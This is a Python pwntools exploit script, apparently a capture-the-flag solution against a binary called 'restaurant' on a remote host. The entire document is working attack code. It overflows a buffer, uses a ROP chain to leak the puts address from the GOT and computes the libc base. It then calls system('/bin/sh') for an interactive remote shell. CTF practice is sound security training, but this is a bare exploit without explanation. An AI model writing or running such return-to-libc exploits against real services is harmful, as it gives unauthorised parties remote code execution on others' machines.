from pwn import remote, p64, u64, ELF, log, context

r = remote('94.237.62.195', 34279)

libc = ELF('./restaurant', checksec=False)
# context.log_level = 'debug'                   # debug
pop_rdi = 0x4010a3
plt_puts = libc.plt['puts']
got_puts = libc.got['puts']
r.sendlineafter('> ', b'1')

payload = b'A'*40
payload += p64(pop_rdi)                         # pop rdi; ret
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(libc.symbols['fill'])          # Back to the fill()

log.info(f"Address of PLT puts: {hex(plt_puts)}")
log.info(f"Address of GOT puts: {hex(got_puts)}")

r.sendlineafter('> ', payload)
r.recvuntil(b'\x10\x40')
puts_leak = u64(r.recv(6).strip().ljust(8, b'\x00'))
log.success(f"Success!!! Here's the address of puts leaked from server: {hex(puts_leak)}")

puts_libc = 0x80aa0
system_libc = 0x4f550
binsh_libc = 0x1b3e1a

libcbase_addr = puts_leak - puts_libc
system_addr = libcbase_addr + system_libc
binsh_addr = libcbase_addr + binsh_libc

payload = b'A'*40
payload += p64(0x40063e)                        # ret - Align the stack
payload += p64(pop_rdi)                         # pop rdi; ret
payload += p64(binsh_addr)
payload += p64(system_addr)

log.info(f"Address of libc base address: {hex(libcbase_addr)}")
log.info(f"Address of system(): {hex(system_addr)}")
log.info(f"Address of /bin/sh: {hex(binsh_addr)}")

r.sendlineafter('> ', payload)
r.interactive()